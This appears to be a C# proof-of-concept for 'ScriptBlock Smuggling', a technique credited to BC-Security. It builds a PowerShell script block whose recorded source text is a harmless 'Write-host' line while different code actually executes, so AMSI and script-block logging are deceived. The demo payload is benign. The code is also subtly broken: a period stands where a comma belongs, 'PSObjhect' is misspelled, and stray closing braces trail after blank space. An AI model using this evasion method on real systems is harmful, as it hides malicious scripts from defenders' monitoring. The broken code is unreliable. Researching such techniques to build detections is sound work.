// Source: https://bc-security.org/scriptblock-smuggling/
// https://github.com/BC-SECURITY/ScriptBlock-Smuggling
public static ScriptBlock BuildSpoofedBlock(string content)
{
    try
    {
        ScriptBlockAst spoofExtentAst = (ScriptBlockAst)ScriptBlock.Create("Write-host 'Hello'").Ast;
        ScriptBlockAst executableAst = (ScriptBlockAst)ScriptBlock.Create(content).Ast;

        ScriptBlockAst newAst = new ScriptBlockAst(
            spoofExtentAst.Extent,
            null,
            null,
            null.
            (NamedBlockAst)executableAst.EndBlock.Copy(),
            null
        );

        return newAst.GetScriptBlock();
    }
    catch (Exception ex)
    {
        Console.WriteLine("Exception in BuildSpoofedBlock: " + ex.Message);
        return null;
    }
}

public static void Main()
{
    string script = @"Write-Output 'amsicontext'";
    ScriptBlock sb = BuildSpoofedBlock(script);
    
    using (Runspace runSpace = RunspaceFactory.CreateRunspace())
    {
        runSpace.Open();
        using (PowerShell ps = PowerShell.Create())
        {
            ps.Runspace = runSpace;
            ps.AddCommand("Invoke-Command")
              .AddParameter("ScriptBlock", sb);

            Collection<PSObjhect> results = ps.Invoke();
            foreach (PSObject result in results)
            {
                Console.WriteLine(result);
            }
            
            foreach (ErrorRecord error in ps.Streams.Error)
            {
                Console.WriteLine("ERROR: " + error);
            }
        }
    }
}































        }
    }
}
